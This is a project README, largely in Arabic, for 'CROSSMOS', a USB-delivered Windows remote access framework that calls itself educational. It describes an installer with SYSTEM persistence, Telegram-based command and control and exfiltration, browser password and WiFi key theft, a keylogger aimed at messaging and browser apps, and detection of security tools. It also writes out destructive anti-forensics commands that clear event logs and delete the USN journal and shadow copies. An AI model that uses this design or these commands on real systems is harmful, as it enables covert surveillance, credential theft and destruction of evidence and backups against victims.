
# CROSSMOS – USB-Based Red Team Attack Framework
**Author:** Anas Labrini  
**Category:** Red Team / Adversary Simulation / Malware Research  
**Language:** C (DigiSpark), PowerShell, Python  
**Status:** Educational & Lab-Only

---

## ⚠️ Disclaimer
This project is developed **strictly for educational purposes, Red Team operations, malware research, and adversary simulation in controlled lab environments**.

**Unauthorized use against systems you do not own or have explicit permission to test is illegal.**  
The author takes no responsibility for misuse.

---
![CROSSMOS Logo](cross.png)


# 🛡️ Windows Core Framework

> Modular Windows Operational Architecture  
> Structured, Persistent & Memory-Oriented Components

---

## 📦 Project Structure

يتكون النظام من عدة وحدات مترابطة، كل وحدة لها دور وظيفي محدد ومسار تشغيل واضح.

---

## 🗂️ Components Overview

| 🧩 File Name | 🎯 Functional Role | 📁 Default Path |
|--------------|--------------------|-----------------|
| **script.ps1** | 🔧 Installer (تهيئة أولية) | One-time execution |
| **wincore.py** | 🧠 C2 Client (العقل المدبر) | `C:\ProgramData\WinCore\` |
| **winexec.py** | ⚔️ Payload Executor (الذراع التنفيذية) | `C:\ProgramData\WinExec\` |
| **syskey.py** | ⌨️ Activity Monitor (Keylogger) | `C:\ProgramData\SysKey\` |
| **windef.py** | 🛰️ Anti-AV Radar (الدفاع الوقائي) | Memory / WinExec |
| **winmon.py** | 👁️ Watchdog Guardian (حارس الاستمرارية) | Memory / WinExec |

---
## 📝 File Analysis — `script.ps1`

> **Role:** Initializer / Installer  
> **Purpose:** Sets up core environment, downloads main components, and ensures persistence.

---

### 📂 Functional Overview

`script.ps1` هو **نقطة الدخول الأولية** للنظام ويقوم بالوظائف التالية:

- إنشاء مجلد أساسي: `C:\ProgramData\WinCore`  
- تنزيل الملفات الرئيسية من الإنترنت:
  - `pywin.exe` → Executable Loader
  - `wincore.py` → C2 Client  
- إنشاء **مهمة مجدولة** تعمل عند بدء النظام (`OnStart`) بصلاحية **SYSTEM**  
- تشغيل المهمة مباشرة بعد إنشائها لضمان التشغيل الفوري

> هذا الملف **يمثل البداية**، ويعد الرابط بين تنزيل الملفات وتشغيلها بشكل دائم عند الإقلاع.

---

### 🛠️ Techniques & Methods Used

| 🔹 Technique | 🔹 Purpose |
|--------------|------------|
| `New-Item -ItemType Directory` | إنشاء مجلد بيئة العمل الأساسي |
| `Invoke-WebRequest` | تنزيل الملفات من GitHub Releases |
| `Test-Path` | التحقق من وجود الملفات لتجنب إعادة التحميل |
| `schtasks /create` | إنشاء Scheduled Task للاستمرارية |
| `schtasks /run` | تشغيل المهمة فور إنشائها |
| Backtick Escaping (`) | تمرير المسارات والملفات داخل الأمر بصيغة صحيحة |

---


## 📝 File Analysis — `wincore.py`

> **Role:** Eexcution / C2 Client  


---

### 📂 Functional Overview

🔴 1️⃣ Command & Control (C2)
التقنية المستخدمة:

Telegram Bot API

Long polling عبر ApplicationBuilder().run_polling()

Authorized Chat ID validation

الخصائص:

تحكم ثنائي الاتجاه

استقبال أوامر + رفع ملفات + تنزيل ملفات

تعدد الوكلاء (Agents dictionary)

اختيار جلسة نشطة (session management)

تنفيذ غير متزامن (ThreadPoolExecutor + asyncio)

📌 هذا نموذج C2 منخفض الضوضاء يعتمد على خدمة شرعية (Living-off-legitimate-platform).

🔴 2️⃣ Persistence Mechanism
التقنية:

Scheduled Task عبر PowerShell

RunLevel Highest

AtLogOn Trigger

Hidden Scheduled Task

السلوك:

إنشاء مهمة باسم WindowsUserAgent

تشغيل winpy.exe + winexec.py

تشغيل تلقائي عند تسجيل الدخول

التحقق من وجود المهمة قبل الإنشاء

📌 Persistence عبر Task Scheduler (شائع جدًا في malware).

🔴 3️⃣ Defense Evasion
A) تعطيل PowerShell Logging

تعديل Registry:

HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

EnableScriptBlockLogging

EnableInvocationHeader

📌 محاولة تعطيل Script Block Logging مؤقتًا أثناء تنفيذ الأوامر.

B) Timestomping

تقنيتان:

1) os.utime
2) Windows API → SetFileTime

تغيير Creation / Access / Modified timestamps

ضبط التاريخ لسنوات قديمة (2017 – 2019)

اختيار وقت 10:30 لتجنب 00:00 المشبوه

📌 Anti-forensics technique (Time manipulation).

C) Prefetch Manipulation

تعديل تواريخ ملفات Prefetch

حذف كامل محتوى:

C:\Windows\Prefetch\

📌 محاولة طمس آثار التنفيذ.

D) DNS Artifact Removal

DnsFlushResolverCache via dnsapi.dll

fallback → ipconfig /flushdns

📌 تقليل الارتباط بين الاتصالات الخارجية والبرنامج.

E) Event Log Clearing

باستخدام:

wevtutil cl System
wevtutil cl Security
wevtutil cl "Windows PowerShell"

📌 محاولة إزالة سجلات النظام.

F) USN Journal Deletion
fsutil usn deletejournal /D C:

📌 إزالة سجل معاملات NTFS (Anti-forensics قوي).

G) VSS Shadow Deletion
vssadmin delete shadows /all /quiet

📌 تعطيل استرجاع النسخ الاحتياطية (سلوك يُرى في ransomware أيضًا).

🔴 4️⃣ Privilege Manipulation
تفعيل SeDebugPrivilege

OpenProcessToken

LookupPrivilegeValueW

AdjustTokenPrivileges

📌 محاولة الحصول على قدرة التعامل مع عمليات النظام.

🔴 5️⃣ Self-Destruction Mechanism

وظيفة:
initiate_final_purge()

المراحل:

Structural file corruption

overwrite headers

random overwrite

truncate

rename random hex

Kill processes

Clear logs

Delete artifacts

Remove directories

Process suicide (os._exit)

📌 آلية تدمير طبقي (Layered destruction routine).

🔴 6️⃣ Credential Access
A) Chrome Master Key Extraction

قراءة:

Local State

Base64 decode

إزالة DPAPI prefix

CryptUnprotectData

B) AES GCM decrypt

📌 نموذج واضح لاستخراج كلمات مرور Chrome/Chromium.

🔴 7️⃣ Surveillance Capabilities
Screenshot

PIL ImageGrab

in-memory PNG buffer

GPS

System.Device.Location

fallback via IP API

Network Radar

Local subnet sweep

Ping scan

Port scan (80, 443, 445, 3389)

netsh wlan show networks

📌 Discovery + Reconnaissance.

🔴 8️⃣ File & System Control Engine

يدعم:

ls / cd / mkdir / rm / rmdir

copy / move / rename

hash (SHA256)

cat / preview

process list / kill

restart / shutdown

disable sleep

environment dump

public IP retrieval

uptime

file upload/download

zip folder exfiltration

📌 Remote shell موسّع.

🔴 9️⃣ Memory Management Concealment

Garbage Collection forcing

Memory watchdog (RAM threshold monitor)

Executor thread pool

Non-blocking architecture

📌 محاولة تقليل footprint أو تجنب تجمّد الجلسة.

🔴 🔟 Infrastructure Resilience

Restore mechanism

Download from GitHub

Recreate winpy.exe from pywin.exe

Verify script integrity (basic content check)

📌 Redundancy & recovery.

🧬 11️⃣ Multi-Agent Architecture

AGENT_ID (UUID short)

ACTIVE_AGENT_ID

Multi-session management

Session isolation logic

📌 أقرب لنمط C2 panel متعدد الضحايا.

🏗 البنية العامة
الطبقة	الوظيفة
Core	C2 + Command Engine
Agent	تنفيذ أوامر المستخدم
Scheduler	Persistence
Anti-forensics	تنظيف آثار
Recovery	Restore capability
Self-destruct	Full wipe
---
## 📝 File Analysis — `winexec.py`
🔴 1️⃣ سرقة كلمات مرور المتصفح
التقنيات المستخدمة:

قراءة:

Chrome / Edge SQLite DB

استخراج:

Local State → AES Master Key

فك التشفير عبر:

win32crypt (DPAPI)

AES GCM

ما يحدث تقنيًا:

استخراج المفتاح الرئيسي من:

Local State

فك تشفيره باستخدام:

CryptUnprotectData

فتح قاعدة بيانات:

Login Data

فك تشفير كل password_value

📌 هذا يعني:

يعتمد على صلاحيات المستخدم الحالي
وليس SYSTEM بالضرورة

🔴 2️⃣ استخراج WiFi Profiles
التقنية:

تشغيل PowerShell داخليًا

استخدام:

netsh wlan show profile key=clear

📌 هذا:

يستخرج كلمات مرور WiFi المخزنة

يعمل بدون API مباشر

يعتمد على subprocess

🔴 3️⃣ استخراج History & Downloads
التقنية:

نسخ قاعدة بيانات المتصفح (لتجنب lock)

قراءة:

urls

downloads

downloads_url_chains

تحويل Chrome Time → Datetime

📌 مميز هنا:

استخدام temp DB

حذف النسخة بعد الاستخدام

تنظيف الذاكرة بـ gc.collect()

🔴 4️⃣ Modular Loader System

يوجد 3 أنظمة تحميل:

A) update()

يحذف wincore.py ويعيد تنزيله وتشغيله

B) download_and_run()

ينسخ pywin.exe إلى:

C:\ProgramData\SysKey

وينزل syskey.py ويشغله

C) startup()

ينزل:

winmon.py

windef.py

ويشغلهم داخل Threads باستخدام:

runpy.run_path

📌 هذا يعني:

Modular architecture
قابل للتوسعة
تحميل ديناميكي للوظائف

🔴 5️⃣ Multi-threaded Execution

يستخدم:

threading.Thread(..., daemon=True)

لتشغيل:

وحدات إضافية

وظائف خلفية

📌 التصميم:

Non-blocking execution
يسمح بتشغيل عدة Modules بالتوازي

🔴 6️⃣ Deep Stealth Layer

يستخدم:

SetFileAttributesW

لتطبيق السمات:

Hidden

System

Read-only

Not indexed

📌 الهدف:

إخفاء الملفات حتى مع إظهار الملفات المخفية

كما يطبق الإخفاء على:

مجلد التنفيذ الحالي

WinCore

WinExec

🔴 7️⃣ File-Based C2 System

أهم جزء في السكربت.

آلية التحكم:

CMD_FILE → يستقبل الأوامر

RES_FILE → يكتب النتائج

SS_FILE → يحفظ screenshots

حلقة لا نهائية:

while True:
    if os.path.exists(CMD_FILE):
        ...

📌 هذا يعني:

لا يوجد اتصال شبكي مباشر
يعتمد على وسيط خارجي يكتب الأوامر في الملف

هذا يسمى:

File-based IPC C2

🔴 8️⃣ Screenshot Capability

يدعم:

Screenshot كامل الشاشة

Screenshot للنافذة النشطة

باستخدام:

PIL.ImageGrab
pygetwindow
🔴 9️⃣ Keylogger Module Management

لا يحتوي keylogger مباشر هنا، لكنه:

ينزل syskey.py

يشغله

يستطيع حذفه

📌 هذا:

Dynamic capability deployment

🔴 10️⃣ Memory Hygiene

يوجد اهتمام ملحوظ بـ:

حذف temp DB

حذف CMD و RES بعد الاستخدام

del res

gc.collect()

📌 هذا ليس anti-forensics قوي
لكنه محاولة تقليل footprint

🧬 التقنيات المصنفة (MITRE ATT&CK)

T1555 – Credentials from Web Browsers

T1040 – Network Sniffing (WiFi credential harvesting)

T1059 – Command Execution

T1105 – Tool Transfer

T1564 – Hide Artifacts

T1057 – Process Discovery (ضمنيًا عبر window grab)

T1113 – Screen Capture

📊 مستوى التعقيد
الجانب	التقييم
المعمارية	متوسطة إلى متقدمة
الإخفاء	متوسط
التحكم	غير تقليدي (ملفات)
Anti-analysis	ضعيف
Persistence	غير موجود هنا (يعتمد على script.ps1)

---
## 📝 File Analysis — `winmon.py`
winmon.py هو:

Infrastructure Protection & Tamper Alert Module

وظيفته ليست سرقة بيانات، بل حماية مكونات المنصة نفسها وإرسال إنذار عند العبث بها.

🏗 الدور داخل المعمارية

بناءً على الملفات السابقة:

script.ps1 → تثبيت وتشغيل

winexec.py → عميل تنفيذ وأوامر

winmon.py → وحدة مراقبة البنية التحتية

هو جزء من طبقة:

Self-Defense / Tamper Detection Layer

🔴 1️⃣ قناة الاتصال: Telegram C2
BOT_TOKEN = "..."
AUTHORIZED_CHAT_ID = ...
التقنية:

استخدام Telegram Bot API

إرسال HTTP POST إلى:

https://api.telegram.org/bot<TOKEN>/sendMessage

📌 هذا يندرج تحت:

Abuse of Legitimate Service (Telegram)

الميزة:

لا حاجة لبناء خادم C2

الاتصال مشفر HTTPS

صعب حظره بدون حظر Telegram بالكامل

🔴 2️⃣ نطاق المراقبة (Scoped Monitoring)
WATCHED_FILES = {
    C:\ProgramData\WinCore\pywin.exe
    C:\ProgramData\WinCore\wincore.py
    C:\ProgramData\WinExec\winpy.exe
    C:\ProgramData\WinExec\winexec.py
}

المراقبة محدودة جدًا:

لا يراقب كل النظام

لا يراقب كل المجلد

فقط ملفات محددة

📌 هذا يقلل الضجيج ويجعل الإشعارات دقيقة.

🔴 3️⃣ File System Monitoring

يعتمد على:

from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

وهي طبقة عالية المستوى فوق:

Windows ReadDirectoryChangesW API

🔴 4️⃣ الأحداث المراقبة

يدعم فقط:

on_deleted

on_moved

لا يدعم:

on_modified

on_created

📌 هذا يعني:

يركز فقط على:

محاولات الحذف أو إعادة التسمية (tampering)

وليس التعديل.

🔴 5️⃣ آلية التحقق
if path in WATCHED_FILES:

مقارنة مباشرة للمسار الكامل بعد تحويله إلى absolute.

📌 لا يوجد:

Hash check

Integrity verification

Content validation

هو مجرد:

Existence-based monitoring

🔴 6️⃣ نمط التشغيل

يحدد المجلدات التي تحتوي الملفات

يراقبها بدون recursive

حلقة sleep 1 ثانية

📌 لا توجد:

رسائل بدء

Logs محلية

Output

هو:

Silent background watcher
لا يوجد تشفير إضافي للرسالة

يعتمد فقط على HTTPS

🧬 MITRE ATT&CK Classification

T1562 – Impair Defenses (Monitoring defense tampering)

T1105 – Exfiltration over Web Service (Telegram)

T1071 – Application Layer Protocol (HTTPS)

T1027 – Obfuscated/Stored Data (Hardcoded token)

🏛 دوره في السلسلة الكاملة

مع وجود:

winexec → التنفيذ

winmon → الحماية

windef (لم يُحلل بعد) غالبًا له دور دفاعي أيضًا

نحن أمام:

Multi-module RAT with self-preservation logic

---

## 📝 File Analysis — `windef.py`
windef.py هو:

Blue-Team / EDR Detection & Alert Module
أو بشكل أدق:
Security Tool Awareness & Environment Monitoring Agent

وظيفته مراقبة البيئة التشغيلية بحثًا عن:

مضادات فيروسات

أدوات تحليل

أدوات تحقيق جنائي

EDR / SIEM

IDS / Network monitoring

أدوات Reverse Engineering

ثم إرسال تنبيه عبر Telegram.

🏗 دوره في المعمارية الكاملة

إذا جمعنا الوحدات:

الوحدة	الدور
script.ps1	Persistence + Installer
winexec.py	RAT Agent
winmon.py	Tamper Alert
windef.py	Security Environment Monitor

فنحن أمام:

Modular RAT Framework
يحتوي على طبقة مراقبة دفاعية (Defensive Awareness Layer)

🔴 1️⃣ قناة الاتصال

مثل winmon.py:

requests.post("https://api.telegram.org/bot<TOKEN>/sendMessage")

📌 يعتمد على:

Telegram Bot API

HTTPS

Token hardcoded

يندرج تحت:

C2 over Legitimate Web Service

🔴 2️⃣ تقنية جمع المعلومات

يعتمد على:

psutil.process_iter(['name'])

أي:

Process Enumeration عبر Windows API

لا يستخدم:

WMI

PowerShell

Syscalls مباشرة

بل يعتمد على psutil abstraction layer.

🔴 3️⃣ قاعدة بيانات ضخمة لأدوات الأمن

مقسمة إلى:

A) WINDOWS_DEFAULT_PROCS

عمليات افتراضية للنظام مثل:

msmpeng.exe

smartscreen.exe

securityhealthservice.exe

vmwp.exe

📌 الهدف:

معرفة إن كان Defender فعال

كشف وجود Sandbox/Hyper-V

B) EXTERNAL_TOOLS_PROCS

قاعدة كبيرة تشمل:

مضادات فيروسات

Avast, Kaspersky, Bitdefender, ESET…

أدوات إزالة مالوير

Malwarebytes, HitmanPro…

أدوات شبكة

Wireshark, Snort, Suricata…

Forensics

FTK, EnCase, Autopsy, Volatility…

Reverse Engineering

IDA, Ghidra, Radare2…

EDR

CrowdStrike, SentinelOne, Carbon Black…

📌 هذا ليس مجرد AV detection
بل:

Blue-Team Environment Profiling

🔴 4️⃣ منطق المراقبة
المرحلة 1: Initial Scan

مرة واحدة عند التشغيل:

يجمع العمليات الحالية

يرسل تقرير إن كانت أدوات حماية تعمل مسبقًا

هذا يشكل:

Baseline environment snapshot

المرحلة 2: Real-time Monitoring

كل 3 ثوانٍ:

يعيد فحص العمليات

إذا ظهرت أداة جديدة:

يرسل تنبيه فوري

المرحلة 3: Threshold Intelligence
if len(running_now) >= 5:

إذا وُجد 5 أدوات تحليل معًا:

يرسل:

High Severity Alert

📌 هذا يشير إلى:

بيئة تحقيق

مختبر تحليل

Incident response scenario

🔴 5️⃣ آلية منع التكرار

يستخدم:

already_notified = set()

حتى لا يرسل نفس التنبيه عدة مرات.

ويعيد السماح بالتنبيه إذا أُغلقت الأداة ثم فُتحت مجددًا.

📌 منطق بسيط لكنه فعال.

🧬 MITRE ATT&CK Classification

T1057 – Process Discovery

T1082 – System Information Discovery

T1518 – Software Discovery

T1071 – C2 over HTTPS

T1083 – File and Directory Discovery (ضمنيًا عبر مراقبة البيئة)

🧠 الهدف التكتيكي

هذا ليس لتعطيل الحماية.

هو فقط:

Early Warning System

لكي يعرف المشغّل أن:

هناك AV نشط

هناك محلل يعمل

هناك مختبر

هناك بيئة Sandbox

هناك EDR مؤسسي

---
## 📝 File Analysis — `syskey.py`

syskey.py هو:

Context-Aware Keylogger + Active Window Intelligence Monitor + Structured Exfiltration Agent

هو أكثر الوحدات تطورًا في السلسلة حتى الآن.

ليس مجرد keylogger عشوائي، بل:

Session-based Behavioral Surveillance Module

🏗 دوره داخل المنصة الكاملة

إذا جمعنا كل الوحدات:

الوحدة	الدور
script.ps1	Persistence
winexec.py	Command Agent
winmon.py	Tamper Alert
windef.py	Security Recon
syskey.py	High-Value Activity Surveillance

syskey.py هو طبقة:

Deep User Activity Intelligence

🔴 1️⃣ رفع الصلاحيات (Privilege Escalation Attempt)
if not ctypes.windll.shell32.IsUserAnAdmin():
    ShellExecuteW(..., "runas", ...)

التقنية:

فحص صلاحيات Administrator

إعادة تشغيل نفسه مع UAC prompt

📌 هذا ليس bypass
بل elevation رسمي عبر UAC.

🔴 2️⃣ بنية الجلسات الذكية (Session-Based Architecture)

تعريف:

class ActiveSession

لكل PID يتم إنشاء:

وقت بداية

Timeline من الأحداث

ربط كل ضغطة مفتاح بنافذة محددة

📌 الفرق هنا:

بدلاً من تسجيل مفاتيح بشكل عشوائي،
يتم تسجيلها ضمن:

Contextual Session Timeline

🔴 3️⃣ مراقبة النافذة النشطة (Foreground Tracking)

يعتمد على:

win32gui.GetForegroundWindow

win32process.GetWindowThreadProcessId

psutil.Process(pid).name()

كل 0.5 ثانية.

📌 هذا يتيح:

معرفة التطبيق الحالي

معرفة عنوان النافذة

ربط الإدخال بالسياق الصحيح

🔴 4️⃣ استخراج URL من المتصفح

تقنية ذكية نسبيًا:

نسخ History DB

البحث عن:

SELECT url FROM urls WHERE title LIKE ?

مطابقة أول 15 حرف من عنوان التبويب

📌 هذا ليس DOM scraping
بل Database correlation approach.

الهدف:

معرفة الرابط الحقيقي المرتبط بالنافذة الحالية.

🔴 5️⃣ تسجيل المفاتيح (Keylogger Core)

يعتمد على:

pynput.keyboard.Listener

ويقوم بـ:

تحويل المفاتيح الخاصة إلى صيغة مفهومة

تسجيلها داخل آخر حدث في timeline

📌 لا يسجل كل شيء.
يسجل فقط إذا كان PID ضمن جلسة مستهدفة.

🔴 6️⃣ التطبيقات المستهدفة
Browsers:

Chrome

Edge

Brave

Apps:

WhatsApp

Telegram

TikTok

LinkedIn

Instagram

ChatGPT

CMD

Gmail

📌 المراقبة قائمة على:

اسم العملية

أو وجود الكلمة في عنوان النافذة

🔴 7️⃣ نظام الإرسال المنظم

عند إغلاق العملية:

يتم إنشاء تقرير نصي منظم

يحتوي على:

وقت البداية

وقت الإغلاق

تسلسل زمني

الروابط

الإدخالات

يتم إرساله عبر Telegram:

bot.send_document()

حذف الملف محليًا

📌 هذا ليس stream live
بل:

Session-based exfiltration

🔴 8️⃣ السلوك السري

لا يوجد:

إخفاء ملفات

Persistence داخلي

Anti-debug

Anti-VM

Obfuscation

لكن يعتمد على:

winexec لتشغيله

windef لتحذيره

winmon لحماية ملفاته

🧬 MITRE ATT&CK Classification

T1057 – Process Discovery

T1113 – Screen Context Monitoring

T1056 – Input Capture

T1555 – Credentials via Input

T1105 – Exfiltration over Web Service

T1082 – System Discovery

🧠 مستوى الذكاء البرمجي
الجانب	التقييم
Keylogging	متوسط
Context Awareness	جيد
Session Modeling	متقدم نسبيًا
Exfiltration	بسيط
Stealth	ضعيف
Anti-analysis	معدوم
🔍 الفرق بينه وبين keylogger تقليدي
Keylogger عادي	syskey.py
يسجل كل المفاتيح	يسجل فقط في سياق جلسة مستهدفة
لا يعرف التطبيق	يعرف التطبيق + العنوان
لا يعرف الرابط	يستخرج الرابط من DB
يرسل raw log	يرسل تقرير منظم زمنيًا
---




### 🔗 Relationship with Other Modules
